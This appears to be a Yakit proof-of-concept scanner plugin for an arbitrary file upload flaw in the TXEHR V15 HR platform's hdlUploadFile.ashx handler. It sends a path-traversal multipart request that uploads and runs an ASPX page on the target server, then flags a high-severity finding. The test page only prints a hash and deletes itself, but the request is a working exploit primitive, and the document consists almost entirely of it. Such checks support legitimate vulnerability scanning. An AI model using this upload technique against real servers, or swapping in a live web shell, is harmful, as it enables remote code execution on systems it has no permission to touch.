yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/abcd HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Length: 10338

-----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
Content-Type: image/png

<%@ Page Language="C#"%>
<%
Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("123456", "MD5"));
System.IO.File.Delete(Request.PhysicalPath);
%>
-----------------------------45250802924973458471174811279

`

    rsp, req, _ = poc.HTTP(packet1, poc.params({"target": addr}), poc.https(isTls), poc.redirectTimes(0), poc.timeout(5))

    //dump(rsp)
    if str.MatchAllOfSubString(rsp, 'HTTP/1.1 200', '/abcd.aspx') {
        yakit.Info(
            "%v found 同享TXEHR V15人力管理管理平台hdlUploadFile存在任意文件上传漏洞", 
            addr, 
        )
        risk.NewRisk(
            addr, 
            risk.title("同享TXEHR V15人力管理管理平台hdlUploadFile存在任意文件上传漏洞"), 
            risk.severity("high"), 
            risk.titleVerbose("同享TXEHR V15人力管理管理平台hdlUploadFile存在任意文件上传漏洞"), 
            risk.request(string(req)), 
            risk.response(string(rsp)), 
            risk.cve("no cve"), 
        )
    }

    return
}

handle = func(result /* *fp.MatchResult */) {
    if !result.IsOpen() {
        return
    }


    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }

}
